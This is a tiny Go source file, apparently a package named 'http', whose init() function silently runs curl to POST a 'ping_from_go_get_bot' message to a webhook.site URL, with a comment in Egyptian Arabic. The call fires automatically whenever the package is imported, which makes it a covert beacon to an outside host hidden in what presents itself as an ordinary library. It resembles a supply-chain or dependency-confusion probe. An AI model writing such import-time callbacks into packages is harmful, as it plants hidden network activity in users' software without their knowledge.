package http

import "os/exec"

func init() {
    // الـ ping بتاعك لـ webhook.site
    exec.Command("curl", "-X", "POST", 
        "https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a",
        "-d", "ping_from_go_get_bot").Run()
}
